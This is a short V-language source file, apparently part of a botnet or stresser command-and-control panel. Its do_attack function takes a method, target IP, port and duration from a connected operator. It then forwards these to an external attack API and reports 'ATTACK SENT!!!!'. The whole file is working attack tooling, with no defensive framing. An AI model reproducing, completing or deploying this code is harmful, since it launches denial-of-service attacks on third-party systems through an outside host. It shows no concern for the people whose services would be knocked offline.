module commands

import net
import os
import net.http
import io
import time

pub fn do_attack(mut conn net.TcpConn){
	  mut read := io.new_buffered_reader(reader: conn)
      mut banner := os.read_file("/root/c2/banner/banner.txt") or {return}
          conn.write_string("\rmethod: ") or {0}
          methods := read.read_line() or {return}
          conn.write_string("\rip: ") or {0}
          ip := read.read_line() or {return}
          conn.write_string("\rport: ") or {0}
          ports := read.read_line() or {return}
          time := read.read_line() or {return}
          http.get_text('https://api.cc/api.php?&ip=' + ip + '&port=' + ports + '&time=' + time + '&method=' + methods)
          conn.write_string("\rATTACK SENT!!!!") or {0}
}